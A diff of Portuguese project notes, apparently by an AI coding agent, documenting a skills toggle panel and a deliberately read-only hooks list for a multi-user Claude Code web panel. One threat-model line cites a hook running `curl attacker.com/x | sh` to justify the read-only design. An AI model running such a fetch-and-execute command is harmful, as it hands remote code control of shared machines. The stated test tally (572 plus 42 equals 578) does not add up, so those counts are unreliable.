@@ -1621,9 +1621,14 @@ classe + contexto de código e precisam de confirmação antes de virar trabalho
    ruleMain/ruleSource/ruleText/addRuleButton/confirmRule/confirmRemoveRow/confirmRemoveText`.
    Provavelmente uma tela de Settings pra editar as regras de allow/deny (equivalente UI do que
    hoje só existe em `settings.json`/CLAUDE.md).
-10. **Lista de hooks** — classe `hookRow`, sem string literal capturada ainda.
+10. **Lista de hooks** — classe `hookRow`, sem string literal capturada ainda. **IMPLEMENTADO em
+    29/09/2026, ver seção 17** — SÓ LEITURA (decisão de segurança: sem canal de edição seguro
+    equivalente ao real, e um hook `command` é shell arbitrário que rodaria sozinho pra todo mundo
+    que usar o projeto depois, numa ferramenta multi-usuário).
 11. **Painel de skills** — classes `skillRow/skillLock/skillNote/skillState` — lista/toggle de
-    skills (ver `Skill` tool desta própria sessão).
+    skills (ver `Skill` tool desta própria sessão). **IMPLEMENTADO em 29/09/2026, ver seção 17** —
+    habilitar/desabilitar de verdade (via `Options.skills` do SDK, filtro de contexto, nunca escreve
+    arquivo/roda comando), modelo de 2 estados (não os 4 reais — ver seção 17 pro porquê).
 12. **Agrupamento de sessões em pastas nomeadas** — classes `newGroupButton/newGroupIcon/
     groupHeader/groupChevron/groupChevronExpanded/groupName/groupNameEditing/groupCount`. O Orion
     já tem um "Agrupar por Nenhum/Projeto/Atividade" (ver Resumo, rodada anterior 2) que é um
@@ -2209,6 +2214,259 @@ sessão SSH sem cabeça); a wiring de `startMic`/`stopMic`/eventos do `MicRecogn
 leitura cuidadosa + `tsc --noEmit` + `vite build` limpo, não por gravação de voz real — mesma
 limitação, honestamente documentada, de toda rodada anterior sem visual-testing.
 
+## 17. Painel de skills + lista de hooks — implementado em 29/09/2026 (itens 10/11 da seção 13)
+
+Fecha os itens 10 ("Lista de hooks", classe `hookRow`, sem string literal capturada ainda) e 11
+("Painel de skills", classes `skillRow/skillLock/skillNote/skillState`) do inventário da seção 13 —
+os dois marcados lá como "achado por nome de classe + contexto de código, sem string literal ainda
+confirmada". Implementado numa worktree isolada (`/srv/orion-worktrees/skills-hooks`, branch
+`feature/skills-hooks`), sem tocar `main` nem os processos de outras sessões paralelas.
+
+### O que a extensão real faz de verdade (lido em `/srv/orion-reference-2.1.283/webview/index.js`, v2.1.283 — a mais nova, ver seção 13)
+
+**Hooks — MUITO mais que uma lista: é um editor completo, mediado pelo próprio CLI.** A investigação
+inicial (seção 13) só tinha achado o nome da classe `hookRow`. Lendo o JS decompilado ao redor dela
+achei o componente inteiro:
+
+- CSS-module `q4` (a classe raiz `hookRow_EAFtCg` está aqui, junto de todo o resto do diálogo):
+  `var q4={loadingText:...,warningBanner:...,eventGroup:...,eventHeading:...,eventName:...,
+  eventSummary:...,eventCount:...,matcherHeading:...,matcherValue:...,hookRow:"hookRow_EAFtCg",
+  typeBadge:...,commandText:...,sourceBadge:...,disabledBadge:...,detail:...,detailTable:...,mono:...,
+  contentLabel:...,contentBlock:...,footer:...,link:...,checkRow:...,popupMessage:...,popupFile:...}`.
+- A lista (`function Y35({policy,rows,grouped,errors,safeMode,bareMode,eventMetadata,hasListing,
+  canEdit,onSelect,onAdd})`) agrupa por evento e, dentro de cada evento, por matcher
+  (`function X35({event,summary,supportsMatcher,matchers,onSelect})`, que renderiza cada linha:
+  `R("button",{className:q4.hookRow,onClick:()=>Y(U,z),children:[F("span",{className:q4.typeBadge,
+  children:U.type}),F("span",{className:q4.commandText,children:U.displayText}),U.disabled&&
+  F("span",{className:q4.disabledBadge,children:"Disabled"}),F("span",{className:q4.sourceBadge,
+  children:U.sourceBadge})]}`) — type badge, texto de exibição, badge "Disabled" condicional, badge de
+  fonte. Bate com o que implementei (`HookRow` em `SkillsHooksPanel.tsx`).
+- Clicar num `hookRow` abre `function Q35({row,eventHasMatchers,catalog,busy,onBack,onEdit,onBusyChange})`
+  — uma tela de DETALHE/EDIÇÃO: se a linha não é editável (`H=$.editable`), mostra só o detalhe
+  read-only (`Z35`, campos Event/Matcher/Type/Source/Plugin/If/Timeout/Status message/Flags — "runs
+  once"/"runs in background" — e um bloco de conteúdo cru); se é editável, mostra o formulário
+  (`RA1`) com botão remover (`Xv`, exige confirmar: "Remove this hook from {fonte} settings?").
+- O formulário de adicionar/editar (`function RA1({catalog,initial,onSubmit,onBack,onBusyChange,disabled})`)
+  tem: seletor "Save to" (`g95 = [localSettings "Local", userSettings "User", projectSettings
+  "Project"]`), `<select>` de evento (`catalog`, vindo do CLI ao vivo), campo de matcher condicional,
+  seletor de Type (`EH0 = [command "Runs a shell command", prompt "Asks a model to evaluate a
+  prompt", agent "Runs an agent to verify something", http "Posts the hook input to a URL", mcp_tool
+  "Calls a tool on a configured MCP server"]`), e campos específicos por tipo (`me[tipo]`, ex.
+  `command: [{key:"command",label:"Command",kind:"textarea",required:true}, ...]`) — ou seja, o campo
+  de comando de um hook `command` é literalmente uma **textarea de texto livre**, sem sandboxing
+  nenhum visível no client (a validação/segurança, se existir, fica inteiramente do lado do CLI).
+- **O mecanismo real de escrita**: cada ação (`add`/`replace`/`remove`) vira um objeto
+  `{op,source,event,matcher,hook,target}` mandado pro backend via `onEdit`/`onSubmit` — que, subindo
+  a cadeia até `function vH0({...editHook,...})`, chama `editHook(request)` (prop injetada de fora,
+  não definida neste componente) com um timeout de 45s (`l95=45000`) e trata timeout/`unconfirmed`
+  como erro. **Nunca escreve o arquivo direto do webview**: o padrão (mesmo já confirmado pra
+  `createWorktree($)`/`setSkillState` na seção 13/15) é um control-request mandado pro processo
+  `claude` CLI já vivo na mesma janela do editor, que valida (`policyUnreadable`, `managedOnly`,
+  `pluginOnly`, `allowManagedHooksOnly`, `disableAllHooks`) e escreve o `settings.json` ele mesmo.
+- Confirma achados anteriores: `d95` mapeia as 5 fontes reais — `userSettings` ("User",
+  `~/.claude/settings.json`), `projectSettings` ("Project", `.claude/settings.json`), `localSettings`
+  ("Local", `.claude/settings.local.json`), `flagSettings` ("Flag", `--settings` na linha de comando),
+  `policySettings` ("Managed", definido pela organização). `n95($)` é a função real que gera o texto
+  de exibição por tipo: `command` → comando (+args), `prompt`/`agent` → o prompt, `http` → a URL,
+  `mcp_tool` → `"{server}/{tool}"` — reimplementada literalmente em `describeHookCommand`
+  (`server/claude/hooks.ts`).
+
+**Decisão de escopo (hooks): SÓ LEITURA — decisão de segurança, documentada, não uma limitação de
+tempo.** Dois motivos, os dois confirmados na fonte, não hipotéticos:
+
+1. **Sem canal de edição seguro equivalente.** O Orion não tem um processo `claude` parado à espera
+   de control-requests de settings — `server/claude/runner.ts` só guarda uma `Query` viva
+   (`Live.query`) ENQUANTO um turno está rodando, limpa no `finally` de `run()`. A maior parte do
+   tempo, pra qualquer sessão ociosa entre turnos, não há NADA ao vivo pra mandar um `edit_hook`
+   pra — replicar o fluxo real exigiria manter um processo `claude` dedicado por projeto só pra isso,
+   fora de proporção pro pedido.
+2. **Um hook `command` é shell arbitrário que passa a rodar sozinho, sem confirmação, em toda sessão
+   futura que tocar o projeto.** Numa extensão local de um usuário só, isso já é um contrato de
+   confiança implícito (o usuário é dono da própria máquina). No Orion — painel **multi-usuário em
+   produção**, `settingSources:['user','project']` em `runner.ts` — qualquer pessoa logada plantando
+   um hook (ex. um `SessionStart` que roda `curl attacker.com/x | sh`) o faria rodar sozinho pra
+   **todo mundo** que abrir esse projeto depois, sessão do Orion ou terminal de um humano. É uma
+   escalação de privilégio real e categoricamente diferente do risco que a extensão assume — o
+   próprio pedido desta tarefa já sinalizava isso como o caso a evitar ("não dê pra usuário escrever
+   comando livre sem pensar no risco").
+
+Implementado: **lista, agrupada por evento/matcher, igual à tela real** — sem adicionar/editar/
+remover. Fonte dos dados: lê os 3 `settings.json` que podem ter uma seção `hooks` diretamente do
+disco a cada chamada (sem cache) — `.claude/settings.json` (projeto), `.claude/settings.local.json`
+(local, não versionado — a extensão real também trata como fonte própria, "Local") e
+`~/.claude/settings.json` (usuário do processo Orion, `danilo`, compartilhado entre todos os
+projetos). **Achado que gerou um aviso próprio na tela**: `server/claude/runner.ts` passa
+`settingSources: ['user','project']` pro SDK — ou seja, hooks que só existem em
+`.claude/settings.local.json` aparecem listados (informação real, não escondida), mas com um banner
+avisando que as sessões do Orion hoje não os carregam de verdade. Managed/policy (organização) e
+hooks de plugin não são lidos — o Orion não tem esse conceito de settings gerenciado por org nem um
+marketplace de plugins ainda (item 3 da seção 13, "não construído nesta rodada" — mesma fronteira).
+
+**Skills — modelo real bem mais rico que "ligado/desligado".** Achados novos, confirmados no bundle:
+
+- CSS-module `$Y` (onde `skillRow`/`skillLock`/`skillState` vivem, junto do menu de comandos de
+  barra — a extensão trata skill como um tipo de comando, ver abaixo): `var $Y={commandList:...,
+  commandItem:...,commandName:...,commandDescription:...,skillRow:"skillRow_HPzOag",inertItem:...,
+  skillState:"skillState_HPzOag",skillLock:"skillLock_HPzOag",emptyState:...}`.
+- **Skill = um tipo de slash command.** Achado que bate com a nota que a própria `Skill` tool desta
+  sessão já sugeria: `sdk.d.ts` descreve `SlashCommand` como "an available skill, invoked via
+  /command syntax" — no vocabulário deste SDK, TODO comando de barra é uma skill (já documentado na
+  seção 5). O menu de comandos real (`cX5({commands,emptyMessage,onSelect,skillRows,extraSkillRows,
+  skillBusy,onSetSkillState})`) mistura os dois: comandos normais (`commandItem`) e, quando um deles
+  tem uma skill associada (`YA1($,skillRows)`), um controle de estado ao lado
+  (`skillRow` = `commandItem` + o controle); `extraSkillRows` são skills que não colidem com nenhum
+  comando visível (linha "inerte" — `inertItem` — só o nome, sem executar nada ao clicar).
+- **Modelo de 4 estados, não 2**: `ZA1=["on","name-only","user-invocable-only","off"]`,
+  `dx={on:"On",name-only:"Name only",user-invocable-only:"User only",off:"Off"}`, tooltips reais em
+  `wU0`: `on`="Listed for Claude, and yours to invoke", `name-only`="Listed for Claude by name only,
+  without its description", `user-invocable-only`="Yours to invoke; Claude does not see it",
+  `off`="Hidden from Claude and from the command list". `NU0($)` cicla pro próximo estado da lista
+  (clique no botão `skillState` avança um estado por vez, não é um simples toggle binário).
+- **Trava por política**: `XA1={plugin:"Managed with its plugin",author:"Set in the skill's own
+  file",policy:"Set by a higher-priority configuration",flag:"Set by a higher-priority
+  configuration","reserved-name":"..."}`; uma skill travada (`locked_by`) mostra `skillLock` em vez
+  do botão de estado: `<span className={$Y.skillLock} title={XA1[H]}>{dx[U.state]} · locked</span>`.
+- **O mecanismo real de escrita**: `Query.setSkillState(name,state)` no SDK real (achado no bundle,
+  NÃO exposto no `sdk.d.ts` público — é um control-request interno, `{type:"set_skill_state",name,
+  state,handles}`), mesmo padrão do `createWorktree`/`editHook`: passa pelo processo `claude` CLI já
+  vivo, nunca escreve arquivo direto. A lista em si vem de `getSkillsDialog()` →
+  `{type:"get_skills_dialog"}`, outro control-request interno — também não documentado no `.d.ts`
+  público.
+- `description` de uma skill na lista, quando mostrada, é `QA1($) = "${$.source} · ${tokens}
+  tokens"` — fonte + contagem aproximada de tokens do arquivo, não o texto do campo `description` do
+  frontmatter (esse é usado só pra decidir quando a skill dispara, não pra exibição na lista real).
+
+**O que o SDK público (`@anthropic-ai/claude-agent-sdk`, o mesmo pacote que `server/claude/runner.ts`
+já usa) realmente expõe** — verificado em `sdk.d.ts`/`sdk-tools.d.ts` antes de decidir a
+implementação, não assumido:
+
+- `Options.skills?: string[] | 'all'` — **campo real, documentado, do lado do CHAMADOR do SDK** (o
+  Orion, não o usuário final): "Skills to enable for the main session... omitted (default): no SDK
+  auto-configuration... not skills off. `'all'`: enable every discovered skill. `string[]`: enable
+  only the listed skills... This is a context filter, not a sandbox: unlisted skills are hidden from
+  the model's listing and rejected by the Skill tool, but their files remain on disk". Exatamente o
+  gancho que faltava pro Orion controlar skills sem precisar do canal interno da extensão.
+  `Query.getAvailableSkills()`/`reloadSkills()` também existem, mas devolvem a mesma forma
+  `SlashCommand[]` (`name`/`description`/`argumentHint`/`aliases?`/`builtin?`) que
+  `supportedCommands()` já usa — sem `state`/`locked_by`/`tokens` (esses só existem no par
+  `get_skills_dialog`/`set_skill_state` interno, não público).
+
+**Decisão de escopo (skills): vai além de só leitura — habilitar/desabilitar, 2 estados, não 4.**
+Mais seguro que hooks (o próprio pedido já sinalizava isso) porque `Options.skills` **nunca escreve
+arquivo nenhum e nunca roda comando nenhum** — é um filtro de contexto puro, reversível a qualquer
+momento, pior caso é uma skill ficar invisível pro modelo por um turno. Implementado com o modelo de
+2 estados (habilitada/desabilitada) que o próprio pedido descreveu ("habilitada/desabilitada"), não
+os 4 da extensão real (`on/name-only/user-invocable-only/off`) — replicar os 4 exigiria o canal
+interno não documentado (`set_skill_state`) que o Orion não tem, e o pedido não pediu o meio-termo
+"listado mas sem instrução" nem "invocável mas escondido do modelo". Fora de escopo também: skills de
+PLUGIN (marketplace ainda não existe no Orion, item 3 da seção 13) e o `description` real de exibição
+"fonte · tokens" (implementado com o `description` do frontmatter mesmo — mais útil pro usuário
+decidir o que desligar do que uma contagem de tokens).
+
+### Descoberta de skills — sem canal ao vivo, leitura direta do disco
+
+Mesmo motivo do lado hooks (sem processo `claude` parado fora de um turno): `discoverSkills`
+(`server/claude/skills.ts`) varre `.claude/skills/<nome>/SKILL.md` do projeto e
+`~/.claude/skills/<nome>/SKILL.md` do usuário do processo Orion — mesmo layout de arquivo que o
+próprio Claude Code usa (frontmatter YAML simples: `name`, `description`, `argument-hint`, entre duas
+linhas `---`), confirmado com um exemplo real neste servidor
+(`~/.claude/skills/migrar/SKILL.md`, `danilo`@c3, já citado na seção 13/15 pra worktrees). **Achado
+extra**: existe de verdade, no mesmo `~/.claude/skills/`, uma pasta `synced/<bucket-uuid>/<nome>/
+SKILL.md` — um pacote de skills sincronizado de fora (claude.ai/Claude Desktop; os nomes batem 1:1
+com as skills desta própria sessão, ex. `pdf`, `pptx`, `debug`, `skill-creator`). O campo `source` do
+SDK real até documenta essa origem: `sdk.d.ts` (~linha 3823) lista `'syncedSkills'` entre os
+identificadores de fonte conhecidos (`"Raw source identifier, e.g. 'userSettings', 'plugin',
+'syncedSkills'"`). `scanSkillsDir` reconhece essa pasta pelo nome (`synced`, sem `SKILL.md` própria)
+e varre mais um nível, rotulando como fonte `synced`.
+
+### O que foi implementado
+
+**Servidor**:
+- `server/claude/hooks.ts` (novo): `describeHookCommand` (texto por tipo, espelha `n95` real),
+  `parseHooksFromSettings` (achata `settings.hooks`, espelha `r95` real), `readProjectHooks` (lê os 3
+  arquivos, banners de erro de parse + `disableAllHooks`), `HOOK_SOURCE_LABEL`/`HOOKS_LOADED_BY_ORION`.
+- `server/claude/skills.ts` (novo): `parseSkillFrontmatter`, `scanSkillsDir`/`discoverSkills`
+  (descoberta em disco, projeto + usuário + `synced`), `applySkillOverrides`/`resolveSkillsOption`
+  (puras — fundem descoberta com overrides salvos / decidem o `Options.skills`),
+  `getSkillOverrides`/`setSkillOverride`/`listProjectSkills`/`turnSkillsOption` (Postgres + wiring).
+- Migração `010_claude_skill_settings` (`server/migrations.ts`): tabela
+  `claude_skill_settings(project_id, skill_name, enabled, updated_by, updated_at)` — só guarda
+  OVERRIDES explícitos; skill sem linha está habilitada (comportamento de sempre).
+- `server/claude/runner.ts`: `TurnParams` ganhou `skills?: string[]`, passado direto pra
+  `Options.skills` do SDK quando presente (`...(p.skills ? { skills: p.skills } : {})`, mesmo padrão
+  condicional de `env`/`mcpServers` já existentes).
+- `server/routes/claude.ts`: `GET /api/claude/projects/:id/hooks` (lê `projects.path`, chama
+  `readProjectHooks`), `GET /api/claude/projects/:id/skills` (`listProjectSkills`),
+  `POST /api/claude/projects/:id/skills` (`{name,enabled}` → `setSkillOverride`, autenticado como
+  qualquer outra rota deste arquivo, sem gate de papel extra — mesmo nível de acesso que trocar
+  modo/modelo/esforço de uma sessão já tem). `turnSkillsOption` fiado nos 2 pontos reais que iniciam
+  um turno (`startFor`, usado por `.../messages` E pela retomada pós-restart; e o `POST /sessions` de
+  criação) — sem opinião (`undefined`) quando nada foi desabilitado, então nenhuma sessão existente
+  muda de comportamento até alguém mexer no painel pela primeira vez.
+
+**Cliente**:
+- `web/src/claude/types.ts`: `HookSourceKind`/`HookEntry`/`HookFileError`/`HookListing`,
+  `SkillSourceKind`/`SkillEntry`, `HOOK_SOURCE_LABEL`/`SKILL_SOURCE_LABEL` — mesma convenção de
+  `ApiSession` (duplicado do servidor, nunca compartilhado de verdade: sem pacote de tipos comum
+  neste projeto).
+- `web/src/claude/mapper.ts`: `groupHooksByEventAndMatcher` (pura — agrupa por evento/matcher, mesma
+  organização visual de `X35`/`Y35` reais).
+- `web/src/claude/api.ts`: `claudeApi.hooks`/`skills`/`setSkillEnabled`.
+- `web/src/claude/icons.tsx`: ícone `Wrench` (gatilho do painel).
+- `web/src/claude/SkillsHooksPanel.tsx` (novo): diálogo único com DUAS abas internas (Hooks/Skills) —
+  o pedido descreveu "uma tela que lista (a)... (b)...", não dois diálogos separados como a extensão
+  real tem. Mesmo padrão visual/mecânico de `AgentMap.tsx` (overlay + painel centralizado, Esc fecha
+  com `capture:true`/`stopImmediatePropagation`, foco no botão fechar ao abrir, SEM `createPortal`
+  pelo mesmo motivo documentado lá — variáveis `--cc-*` de tema só existem sob `.cc`). Aba Hooks:
+  lista agrupada, banners de `disableAllHooks`/erros de parse/hooks só-locais; sem NENHUMA ação de
+  editar. Aba Skills: linha por skill (nome, descrição, badge de fonte, botão
+  Habilitada/Desabilitada) — clique chama `setSkillEnabled` e atualiza local, com estado "Salvando…"
+  (mesmo espírito do `Saving…` real em `skillState`).
+- `web/src/claude/ClaudePage.tsx`: gatilho `Wrench` em `.cc-tab-actions` (mesmo grupo de
+  Sync/Power/AgentMap), estado `skillsHooksOpen`, `activeProject` (resolvido por `project_slug`,
+  mesmo caminho que `activeProjectPath` já usava pro banner de worktree — a resposta de
+  `GET /api/claude/sessions` não tem `project_id`, só `project_slug`/`project_name`).
+- `web/src/claude/claude.css`: bloco `.cc-skillshooks-*`/`.cc-hook-*`/`.cc-skill-*`, reusando a
+  moldura `.cc-agentmap` (overlay/cabeçalho/corpo) já existente — só o essencial novo (abas, linhas).
+
+### Testes (TDD, vermelho→verde)
+
+`tests/hooks.test.ts` (19 testes): `describeHookCommand` (todos os tipos + fallback defensivo pra
+tipo desconhecido), `parseHooksFromSettings` (formato real achatado, matcher ausente, vários
+grupos/hooks, `disabled`/`timeout`, defensivo contra formato malformado), `readProjectHooks` (com
+diretórios reais via `mkdtemp` — nenhum arquivo, junta os 3 com o `source` certo, JSON inválido vira
+erro sem derrubar os outros, `disableAllHooks` em qualquer arquivo liga a flag).
+
+`tests/skills.test.ts` (17 testes): `parseSkillFrontmatter` (name/description/argument-hint, sem
+frontmatter, aspas, chave desconhecida ignorada, frontmatter vazio), `scanSkillsDir`/`discoverSkills`
+(diretório ausente, skill normal, sem `name` usa a pasta, pasta sem `SKILL.md` ignorada, pasta
+`synced` varrida um nível a mais, junta projeto+usuário), `applySkillOverrides` (sem override/com
+override/override de skill que não existe mais), `resolveSkillsOption` (nada desabilitado → 
+`undefined`, algumas → lista das demais, todas → array vazio, não `undefined`).
+
+`tests/hooksGrouping.test.ts` (6 testes): `groupHooksByEventAndMatcher` (lista vazia, um grupo,
+matchers diferentes no mesmo evento, eventos na ordem de primeira aparição, matcher vazio agrupa
+junto, não muta a entrada).
+
+Suíte inteira: **578 testes** (572 antes desta rodada + 42 novos: 19+17+6), todos verdes. `npm run
+typecheck` (`tsc -p tsconfig.server.json` e `tsc -p tsconfig.json`, os dois `--noEmit`) sem erro.
+`npm run build` (`vite build && tsc -p tsconfig.server.json`) limpo — único aviso é o de chunk grande
+do `Editor` (CodeMirror), pré-existente, sem relação com esta rodada.
+
+**Sem navegador/visual-testing neste ambiente** — mesma limitação de sempre; o painel (abas,
+agrupamento de hooks, linhas de skill, botão de toggle) não foi visto renderizado de verdade, só
+revisado por leitura cuidadosa comparando com o padrão já em produção de `AgentMap.tsx` (mesma
+moldura de diálogo, reusada literalmente) e testado via a lógica pura (`groupHooksByEventAndMatcher`,
+`parseHooksFromSettings`, `parseSkillFrontmatter`, etc.) + os tipos batendo em `npm run typecheck`.
+
+**Limitação de verificação documentada**: como em rodadas anteriores, este worktree
+(`skills-hooks`) não é o processo `orion-central` rodando de verdade — as rotas novas
+(`GET/POST /api/claude/projects/:id/{hooks,skills}`) não foram testadas com `curl` autenticado contra
+produção, só por leitura de código (mesmo padrão `preHandler` de autenticação que já cobre todas as
+rotas de `claudeRoutes`) + a suíte de `vitest` que cobre a lógica que as rotas chamam. A migração
+`010_claude_skill_settings` também não rodou em produção ainda (roda sozinha no próximo boot do
+processo real, como todas as migrações deste arquivo).
+
 ## Resumo
 
 - **já tem** (de rodadas anteriores): ~24 itens, mais busca por título, filtro "Ativas",
@@ -2465,3 +2723,24 @@ limitação, honestamente documentada, de toda rodada anterior sem visual-testin
   TDD (vermelho→verde confirmado); suíte inteira **558 testes**, `npm run typecheck` e `npm run build`
   verdes. Sem navegador neste ambiente — não dá pra testar o reconhecimento de voz de verdade (depende
   de microfone e permissão reais); mesma limitação de sempre, honestamente documentada.
+- **implementado nesta rodada** (29/09/2026 — painel de skills + lista de hooks, itens 10/11 da seção
+  13, worktree isolada `feature/skills-hooks`; ver seção 17 para os detalhes e evidências completas):
+  `SkillsHooksPanel.tsx` (novo diálogo, mesmo padrão visual/mecânico de `AgentMap.tsx`, gatilho
+  `Wrench` em `.cc-tab-actions`) com duas abas. **Hooks: SÓ LEITURA** — decisão de segurança
+  documentada a fundo (a extensão real tem um editor completo, mas ele nunca escreve
+  `settings.json` direto do webview: cada ação passa por um control-request pro processo `claude`
+  CLI já vivo, canal que o Orion não tem fora de um turno ativo; e um hook `command` é shell
+  arbitrário que, numa ferramenta multi-usuário, rodaria sozinho pra qualquer pessoa que usasse o
+  projeto depois — risco real de escalação, não hipotético). Lista agrupada por evento/matcher
+  (`server/claude/hooks.ts`: `readProjectHooks` lê os 3 `settings.json` — projeto/local/usuário —
+  direto do disco). **Skills: vai além de só leitura** — habilitar/desabilitar de verdade via
+  `Options.skills` do SDK (`sdk.d.ts`: "context filter, not a sandbox", nunca escreve arquivo/roda
+  comando), modelo de 2 estados (não os 4 reais `on/name-only/user-invocable-only/off`, que
+  exigiriam o control-request interno não documentado `set_skill_state`) — persistido em
+  `claude_skill_settings` (migração `010`), aplicado no próximo turno via `TurnParams.skills` em
+  `server/claude/runner.ts`. Descoberta em disco (`server/claude/skills.ts`:
+  `.claude/skills/<nome>/SKILL.md` do projeto + usuário, incluindo uma pasta `synced/<bucket>/<nome>`
+  achada de verdade neste servidor — skills sincronizadas de fora, fonte `syncedSkills` documentada
+  no `sdk.d.ts`). 42 testes novos (19 `tests/hooks.test.ts`, 17 `tests/skills.test.ts`, 6
+  `tests/hooksGrouping.test.ts`), TDD, suíte inteira **578 testes**, `npm run typecheck` e `npm run
+  build` verdes. Sem navegador/visual-testing neste ambiente — mesma limitação de sempre.
